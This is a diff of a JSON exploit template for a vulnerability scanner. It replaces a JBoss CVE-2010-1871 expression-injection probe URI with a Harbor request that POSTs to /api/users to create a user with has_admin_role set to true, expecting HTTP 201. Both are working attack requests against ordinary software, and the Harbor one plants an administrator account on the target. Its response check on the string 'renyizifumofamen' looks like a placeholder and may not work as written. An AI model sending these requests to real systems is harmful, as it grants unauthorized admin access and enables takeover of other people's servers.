@@ -1,15 +1,15 @@
 {
-    "Name": "jboss-cve-2010-1871",
-    "Description": "jboss-cve-2010-1871, command execution vulnerability",
-    "Product": "jboss",
+    "Name": "Harbor Unauthorized Admin Account Creation",
+    "Description": "Unauthorized account creation",
+    "Product": "Harbor",
     "author": "chumeng",
     "Request":[
-        {
-        "Method": "GET",
+                {
+        "Method": "POST",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/admin-console/index.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23%7b33333*33333%7d",
+        "Uri":"/api/users",
         "Port":"",
-        "Data":"",
+        "Data":"{\"username\":\"chumeng\",\"email\":\"chumeng@qq.com\",\"realname\":\"chumeng\",\"password\":\"chumengchumeng\",\"comment\":\"1\",\"has_admin_role\":true}",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -17,17 +17,17 @@
         "Checks": [
             {
                 "Operation": "contains",
-                "Key":"location",
-                "Value": "1111088889"
+            "Key":"",
+                "Value": "renyizifumofamen"
             },
             {
                 "Operation": "code",
-                "Key":"",
-                "Value": "302"
+            "Key":"",
+                "Value": "201"
             }
-
         ]
         },
         "Next_decide":""
                 }
 ]}
+
